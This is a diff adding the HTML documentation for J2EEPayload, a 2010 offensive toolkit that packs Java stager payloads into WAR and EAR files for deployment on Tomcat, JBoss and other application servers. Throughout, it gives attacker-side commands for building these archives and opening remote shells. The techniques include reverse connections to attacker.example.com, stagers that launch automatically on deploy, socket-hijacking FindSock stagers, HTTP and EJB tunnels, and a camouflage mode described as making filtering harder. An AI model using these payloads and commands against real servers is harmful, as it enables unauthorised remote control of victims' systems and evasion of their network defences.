@@ -1,0 +1,337 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<style type="text/css">
+body {
+	font-family: Verdana, Arial, sans-serif;
+	font-size: 10pt;
+}
+
+p {
+	margin-left: 2em;
+	margin-right: 2em;
+}
+</style>
+<title>J2EEPayload - Java Stager Payloads for enterprise servers</title>
+</head>
+<body>
+<h1>J2EEPayload - Java Stager Payloads for enterprise servers</h1>
+
+<p><i>&copy; 2010 Michael 'mihi' Schierl, <tt>&lt;schierlm
+at users dot sourceforge dot net&gt;</tt></i></p>
+
+<p><a href="J2EEPayload-0.1.zip">Download J2EEPayload-0.1.zip</a>
+(both source and compiled classes, 478 KB)</p>
+
+<p>Based on <a
+	href="http://schierlm.users.sourceforge.net/JavaPayload/">JavaPayload
+0.2</a></p>
+
+<h2>Introduction</h2>
+
+<p>The <a href="http://schierlm.users.sourceforge.net/JavaPayload/">JavaPayload</a>s
+contain useful payloads written in pure Java to leverage vulnerabilities
+in J2SE environments. But when you find a FTP directory called <tt>webapps</tt>
+or <tt>deploy</tt> where there are WAR or EAR files in them, they do not
+directly help you, because they do not contain stagers suitable for this
+environment</p>
+
+<p>Therefore, this archive contains a collection of WAR and EAR
+compatible stagers that use a variety of communication methods to
+communicate back to the attacker - even if the only open port is the
+HTTP/JNDI port, or even if no incoming ports are open but the victim can
+call back (which can be tricky as usually WARs and EARs are initialized
+on demand).</p>
+
+<p>In corporate environments (i. e. "enterprise") you might also
+find picky firewalls that reset your connections whenever you send <tt>0xCAFEBABE</tt>,
+or the only possible means of communication between attacker and victim
+may be a common directory share where both parties have write access.
+For forwarding TCP connections in these scenarios, the <a
+	href="http://jtcpfwd.sourceforge.net/">jTCPfwd</a> package usually is a
+life saver. Therefore, this archive also contains wrapper code that can
+be used to wrap a jTCPfwd Listener or Forwarder into a JavaPayload
+stager.</p>
+
+<h2>System requirements</h2>
+
+<p>In addition to the system requirements of JavaPayload:</p>
+
+<p><b>On the "attacker" machine:</b> Application server client
+libraries (matching to the used appplication serve for attacking an
+application server via EJB. No additional requirements for attacking a
+servlet container.</p>
+
+<p><b>On the "victim" machine:</b> Java Runtime Environment 1.4, and
+a Servlet-2.2 compatible servlet container or an EJB2 compatible
+application server.</p>
+
+<p>For the jTCPfwd stagers: no additional system requirements in
+addition to those of JavaPayload and jTCPfwd.</p>
+
+<h2>Quickstart</h2>
+
+<p>This quickstart is divided into two parts: First about exploiting
+servlet containers (like Apache Tomcat), then about exploiting J2EE
+application servers (like JBoss). As most application servers also
+contain a servlet container, the servlet exploits can also be used for
+application servers, if their HTTP port is reachable from the attacker's
+machine.</p>
+
+<p>This quickstart assumes that you have completed the quickstart of
+JavaPayload before and you know how handlers, stagers and stages
+interact.</p>
+
+<h2>Servlets</h2>
+
+<p>Servlets are Java classes that handle HTTP requests in a servlet
+container. Usually you can deploy servlets by packing them into a WAR
+file and upload it into a <tt>webapps</tt> or <tt>deploy</tt> directory.
+The servlets will automatically be deployed and can be accessed by the
+path starting with the WAR file name.</p>
+
+<p>Servlet stagers have been tested with Apache Tomcat 3.2, 4.0,
+5.0, 5.5, 6.0 and 7.0beta; Jetty 4.2 and 6.1; JBoss 3.2.3 and 5.1.</p>
+
+<p>In the following examples I assume that you have <tt>J2EEPayload.jar</tt>,
+<tt>JavaPayload.jar</tt>, <tt>jTCPfwd.jar</tt> and <tt>servlet-api-2.2.jar</tt>
+in your classpath.</p>
+
+<h3>Launching "normal" stagers on the servlet container</h3>
+
+<p>The "JavaPayload" servlet (path <tt>/jp</tt>) can be used to
+interactively launch stagers on the servlet server. For this, you have
+to build a war that includes the stagers you want to use.</p>
+
+<p><b>On the "attacker" machine:</b></p>
+<p><tt>java j2eepayload.builder.WarBuilder Example1.war BindTCP
+ReverseTCP</tt></p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseTCP
+attacker.example.com 2010 -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+<p>deploy Example1.war to the victim machine (victim.example.com).</p>
+<p>Open <tt>http://victim.example.com/Example1/jp</tt> in your web
+browser.</p>
+<p>Enter <tt>ReverseTCP attacker.example.com 2010 -- JSh</tt> into
+the input box and hit return.</p>
+
+<h3>Loading a "normal" stager automatically when a servlet is
+deployed</h3>
+
+<p>In rare cases, the attacker can deploy a servlet to a servlet
+container but cannot access that container via HTTP. But, for some
+strange reasons, the servlet container can connect back to the attacker.
+If the servlet container supports the <tt>&lt;load-on-startup/&gt;</tt>
+directive (most do, but not all), you can configure a servlet to be
+initialized after it is deployed, not (as usual) when it is first
+accessed. This scenario is supported by J2EEPayloads.</p>
+
+<p><b>On the "attacker" machine"</b></p>
+<p><tt>java j2eepayload.builder.WarBuilder Example2.war
+ReverseTCP -- ReverseTCP attacker.example.com 2010 -- JSh</tt></p>
+<p><tt>java javapayload.handler.stager.StagerHandler ReverseTCP
+attacker.example.com 2010 -- JSh</tt></p>
+
+<p><b>On the "victim" machine:</b></p>
+<p>deploy Example2.war to the victim machine, that's it.</p>
+
+<h3>Using the ServletFindSock stager</h3>
+
+<p>A "FindSock" stager is a stager that tries to "find" the socket
+that was used to initiate a HTTP connection and hijack it for sending
+data in both directions. Unlike native findsock implementations, this
+implementation is in pure Java and uses reflection (starting on the
+Request and Response objects) to find an object of type java.net.Socket
+or java.nio.channels.SocketChannel in one of its local variables (or in
+objects or arrays referenced in local variables, recursively). This
+works amazingly well in most cases where the whole servlet container is
+written in Java. In cases where sockets are handled in native code (most
+servlet connectors for "traditional" webservers, and also when using
+Apache APR for Tomcat), this stager will fail, though. For the Apache
+APR case, see the next section. In case the servlet container insists to
+close the socket quickly, you can add a fifth parameter of "C" which
+will clone the Socket object and render the original one useless (by
+removing its SocketImpl reference).</p>
+
+<p>To debug the stager, you can use a fifth argument of "V"
+(verbose) to print out all the classes and objects the FindSock stager
+finds on its way instead of hijacking the socket.</p>
+
+<p>This stager is useful if the only connection you can make to the
+victim machine is via HTTP, and there is no way to connect back to thee
+attacker either. Note that the FindSock stager will not work via HTTPS.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java j2eepayload.builder.WarBuilder Example3.war
+ServletFindSock</tt></p>
+<p>deploy Example3.war to the victim machine (victim.example.com)</p>
+<p><tt>java javapayload.handler.stager.StagerHandler
+ServletFindSock victim.example.com 80 /Example3 -- JSh</tt></p>
+
+<h3>Using the ServletApacheFindSock stager</h3>
+
+<p>In case you are sure that the target is an Apache server, the
+ApacheFindSock servlet can be used; this one uses some native method
+trickery to access native APR sockets (as well as the traditional
+findsock approach, of course). Note that running this stager on
+non-Apache servers will most likely crash the server; in rare cases it
+might even crash Apache servers. If the APR method fails (and the server
+has not crashed yet), it will fall back to the "traditional" FindSock
+approach.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java j2eepayload.builder.WarBuilder Example3a.war
+ServletApacheFindSock</tt></p>
+<p>deploy Example3a.war to the victim machine (victim.example.com)</p>
+<p><tt>java javapayload.handler.stager.StagerHandler
+ServletFindSock victim.example.com 80 /Example3a/apache -- JSh</tt></p>
+
+<h3>Using the ServletTunnel stager</h3>
+
+<p>In cases where the FindSock stager does not work (native
+connector, HTTPS, etc.), but the only connection you can use is the
+connection to the servlet container, you can still use the ServletTunnel
+stager.</p>
+<p>Note that this stager is noticably slower and more
+traffic-consuming, but as a last resort it can be very useful.</p>
+
+<p>This stager supports two modes, streaming and polling mode. A
+third mode is provided by the Camouflage stager, see below. In streaming
+mode, it opens two connections to the victim, one POST and one GET
+connection. These connections are used to stream incoming and outgoing
+data to the servlet, and are never closed. Every 15 seconds a keep-alive
+packet is sent. This option is more efficient than the polling mode, but
+will fail if some proxy, cache or antivirus waits for the request to
+complete before it is forwarded. In polling mode, both the GET and the
+POST connections are closed and restarted every time data is sent over
+them. So, the GET connection will still wait for data (or a configurable
+timeout), but as soon as data can be returned, the connection will be
+closed afterwards. The POST connection works the same way. To use
+polling mode, you have to add an additional timeout parameter (in
+milliseconds) to the stager command line. Try to use a large timeout
+(fewer useless requests), but keep it small enough that your
+firewall/antivirus does not interrupt the connection before data can be
+sent.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java j2eepayload.builder.WarBuilder Example4.war
+ServletTunnel</tt></p>
+<p>deploy Example4.war to the victim machine (victim.example.com)</p>
+<p><tt>java javapayload.handler.stager.StagerHandler
+ServletTunnel http://victim.example.com/Example4 -- JSh</tt></p>
+<p>&mdash; or, to use polling mode (1 second timeout) &mdash;</p>
+<p><tt>java javapayload.handler.stager.StagerHandler
+ServletTunnel http://victim.example.com/Example4 1000 -- JSh</tt></p>
+
+<h3>Camouflage mode</h3>
+
+<p>In camouflage mode, the stager will use only one POST connection
+using the normal URL encoded parameter and HTML response format. One
+parameter, named JP, is used to encode all binary data in English-like
+looking text (to make filtering harder). The response will be encoded in
+English-like looking text on a sample HTML page. No two requests will be
+sent at the same time, therefore this will need a lot of more polling
+then the other alternative. The code is reused from jTCPfwd's Camouflage
+engine, that's why jTCPfwd has to be on the class path for this one to
+work.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java j2eepayload.builder.WarBuilder Example4c.war ServletCamouflageTunnel</tt></p>
+<p>deploy Example4c.war to the victim machine (victim.example.com)</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ServletCamouflageTunnel http://victim.example.com/Example4c 1000 -- JSh</tt></p>
+<p>&mdash; or, to use your own parameters &mdash;</p>
+<p><tt>java javapayload.handler.stager.StagerHandler ServletCamouflageTunnel :http://victim.example.com/Example4c/jpc?count=#C#&amp;x=1#POST#foo=bar&amp;JP=#DATA#&fun=#R99# 1000 -- JSh</tt></p>
+
+<h2>Enterprise Java Beans (EJBs)</h2>
+
+<p>In case you want to exploit an application server like JBoss
+(where you have to deploy EARs), this section is for you.</p>
+
+<p>You can create an EAR that contains only a WAR, by calling <tt>java
+j2eepayload.builder.WarBuilder</tt> with parameter <tt>WAR</tt> followed by
+the parameters used by WarBuilder, for example:</p>
+<p><tt>java j2eepayload.builder.EarBuilder WAR ServletTunnel
+ServletFindSock ReverseTCP</tt></p>
+
+<p>If the application server includes a servlet container you can
+access, you can use all the attacks above in this way. Note that some
+application servers do not support the <tt>&lt;load-on-startup/&gt;</tt>
+directive for servlets.</p>
+
+<p>In case you cannot access the servlet container (or there is not
+any), you might be able to access an EJB via JNDI. J2EEPayload contains
+only Version 2 EJBs, because they are more compatible than the newer
+Version 3 ones, and it is usually easier to call them from outside an
+application server via JNDI.</p>
+
+<p>When you want to access an EJB from outside an application
+server, you need two things:</p>
+<ul>
+	<li>A <tt>jndi.properties</tt> file in your class path (not in the
+	current directory; if it is in the current directory, make sure that <tt>.</tt>
+	is in your class path.<br />
+	For JBoss this file looks like this:<br />
+	<tt>java.naming.factory.initial=org.jnp.interfaces.NamingContextFactory<br />
+	java.naming.factory.url.pkgs=org.jboss.naming:org.jnp.interfaces<br />
+	java.naming.provider.url=jnp://victim.example.com:1099</tt></li>
+	<li>The application server's client library. The version must
+	match the version of the application server to be attacked. Either you
+	can download it from the victim machine, or you have to know the exact
+	version of the application server. The client library for JBoss is
+	called <tt>client\jbossall-client.jar</tt>. Note that this client
+	library often contains classpath references to other Jar files in the
+	same directory, so you might have to copy more than only this file.</li>
+</ul>
+
+<p>The EJBs have been tested with JBoss 3.2.3 and JBoss 5.1.</p>
+
+<h3>Launching "normal" stagers via EJB</h3>
+
+<p>Normal stagers can be started via a stateless session bean that
+registers itself as <tt>JavaPayload</tt>.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java j2eepayload.builder.EarBuilder EJB ReverseTCP</tt></p>
+<p><tt>rename EJB_ReverseTCP.ear Example1.ear</tt></p>
+<p>deploy Example1.ear to the victim machine</p>
+<p><tt>java javapayload.handler.stager.StagerHandler EJB
+ReverseTCP attacker.example.com # -- JSh</tt></p>
+
+<h3>Using the EJBTunnel stager</h3>
+
+<p>Data can also be tunneled through the JNDI connection, by using a
+stateful session bean that registers itself as <tt>JavaPayloadTunnel</tt>.
+There are two instances of this EJB created, one for sending data, one
+for receiving, as calling two methods of one EJB simultaneously will
+cause trouble.</p>
+
+<p><b>On the "attacker" machine</b></p>
+<p><tt>java j2eepayload.builder.EarBuilder EJB EJBTunnel</tt></p>
+<p><tt>rename EJB_EJBTunnel.ear Example2.ear</tt></p>
+<p>deploy Example2.ear to the victim machine (undeploy Example1.ear
+first)</p>
+<p><tt>java javapayload.handler.stager.StagerHandler EJBTunnel
+-- JSh</tt></p>
+
+<h2>jTCPfwd based stagers</h2>
+
+<p>To create a jTCPfwd based stager, run <tt>java
+j2eepayload.builder.JTCPfwdBuilder</tt> (which will need <tt>asm-3.2.jar</tt>
+on the class path), followed by <tt>F</tt> or <tt>L</tt> (for Forwarder
+or Listener), followed by the jTCPfwd module rule that should be used.
+This will create a new file, <tt>jtcpfwd-stager.jar</tt> containing
+either a <tt>JTCPfwdForwarder</tt> or <tt>JTCPfwdListener</tt> stager,
+that can be used with JavaPayload as usual. It expects one stager
+parameter, the rule (again).</p>
+
+<p>To connect to this stager, stager handlers of the same names are
+also included in J2EEPayload (or use jTCPfwd standalone and let it
+forward data to a normal Bind/Reverse stager handler). These stager
+handlers expect two parameters. The first one is the listener/forwarder
+rule used by the stager, and the second one is the forwarder/listener
+rule the stager handler should use to communicate with the stager (which
+is usually not the same as the rule used by the stager).</p>
+
+</body>
+</html>
